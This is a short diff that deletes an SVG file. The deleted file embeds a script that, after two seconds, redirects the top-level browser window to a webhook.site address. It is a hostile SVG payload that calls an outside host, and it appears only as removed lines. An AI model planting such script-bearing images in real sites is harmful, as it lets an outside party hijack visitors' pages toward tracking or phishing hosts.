@@ -1,7 +1,0 @@
-<svg xmlns="http://www.w3.org/2000/svg">
-  <script>
-    setTimeout(() => {
-      window.top.location.href = "https://webhook.site/...";
-    }, 2000);
-  </script>
-</svg>
